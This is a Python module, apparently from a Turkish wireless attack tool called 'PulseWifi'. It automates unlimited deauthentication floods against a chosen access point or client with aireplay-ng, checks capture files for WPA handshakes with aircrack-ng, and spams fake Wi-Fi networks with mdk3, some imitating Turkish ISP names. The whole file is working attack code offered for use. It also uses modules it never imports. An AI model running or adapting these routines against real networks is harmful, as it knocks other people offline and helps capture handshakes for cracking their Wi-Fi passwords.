import subprocess

def pulse_kick(iface, bssid, client=None, timer=0):
    print(f"\n    [*] Vuruş başlatılıyor... (Süre: {'Sınırsız' if timer==0 else str(timer)+' sn'})")
    # 0 parametresi sınırsız paket yollar (Durdurana kadar)
    cmd = f"sudo aireplay-ng -0 0 -a {bssid}"
    if client: cmd += f" -c {client}"
    cmd += f" {iface}"
    
    try:
        if timer > 0:
            subprocess.run(cmd, shell=True, timeout=timer)
            print(f"\n    [✔] Süre doldu. Vuruş durduruldu.")
        else:
            subprocess.run(cmd, shell=True)
    except subprocess.TimeoutExpired:
        print(f"\n    [✔] Süre doldu. Vuruş durduruldu.")
    except KeyboardInterrupt:
        print(f"\n    [!] Vuruş manuel iptal edildi.")

def verify_handshake(cap_file):
    print(f"\n    [*] {cap_file} analizi yapılıyor...")
    cmd = f"sudo aircrack-ng {cap_file}"
    res = subprocess.run(cmd, shell=True, capture_output=True, text=True)
    
    if "1 handshake" in res.stdout or "WPA (1 handshake" in res.stdout:
        print(f"    [✔] MÜKEMMEL! Geçerli bir Handshake yakalandı.")
        return True
    else:
        print(f"    [✘] Handshake bulunamadı. Hedefi daha sert düşürmen lazım.")
        return False

def beacon_spam(iface):
    print(f"\n    {'\033[96m'}[*] BEACON SPAM (Sahte Ağ Yayma) MODU{'\033[0m'}")
    print(f"    {'\033[93m'}[1]{'\033[0m'} Varsayılan Troll Listesi (Eğlenceli İsimler)")
    print(f"    {'\033[93m'}[2]{'\033[0m'} Rastgele İsimler Üret (Kaos Modu)")
    print(f"    {'\033[93m'}[3]{'\033[0m'} Kendi .txt Dosyanı Kullan")
    
    secim = input(f"\n    Seçiminiz: ")
    
    # MDK3'ün okuyacağı dosyanın yolu
    spam_file = "/tmp/pulse_spam.txt"
    
    # 3. SEÇENEK: Kendi dosyasını kullanma
    if secim == "3":
        dosya_yolu = input("    .txt dosyasının tam yolunu girin (Örn: /home/enes/isimler.txt): ")
        if not os.path.exists(dosya_yolu):
            print("    [!] Dosya bulunamadı! İşlem iptal ediliyor.")
            return
        spam_file = dosya_yolu
        print(f"    [*] {dosya_yolu} içindeki isimler kullanılıyor...")
        
    else:
        # 2. SEÇENEK: Rastgele isimler üretme (Kaos)
        if secim == "2":
            print("    [*] Rastgele 100 adet ağ ismi üretiliyor...")
            ssids = []
            for _ in range(100):
                # 6 ile 12 karakter arası rastgele harf ve rakamlar oluşturur
                uzunluk = random.randint(6, 12)
                isim = ''.join(random.choices(string.ascii_uppercase + string.digits, k=uzunluk))
                ssids.append(f"WIFI_{isim}")
                
        # 1. SEÇENEK: Varsayılan (Eğlenceli)
        else:
            print("    [*] Troll listesi yükleniyor...")
            ssids = [
                "[Hacked by PulseWifi]", 
                "FBI Surveillance Van", 
                "Bedava İnternet (VIRUSLU)", 
                "Senin Wi-Fi Artik Benim", 
                "Baglan da Hacklen", 
                "Kacinci Katta Oturuyorsun",
                "TurkTelekom_5G_Test",
                "Superonline_GUEST"
            ]
        
        # Üretilen veya seçilen listeyi geçici dosyaya yazıyoruz
        with open(spam_file, "w") as f:
            for isim in ssids:
                f.write(isim + "\n")
    
    print(f"\n    [*] Sahte ağ sinyalleri havaya basılıyor... (Durdurmak için CTRL+C)")
    try:
        # -a parametresi WPA2 şifreli gibi gösterir (daha inandırıcı), -s 1000 hızı belirler
        cmd = f"sudo mdk3 {iface} b -f {spam_file} -a -s 1000"
        subprocess.run(cmd, shell=True)
    except KeyboardInterrupt:
        print(f"\n    [✔] Spam durduruldu. Hava sahası temizlendi.")
    except Exception as e:
        print(f"\n    [✘] Hata: 'mdk3' aracı eksik olabilir. (Terminalde: sudo apt install mdk3 yazarak kur)")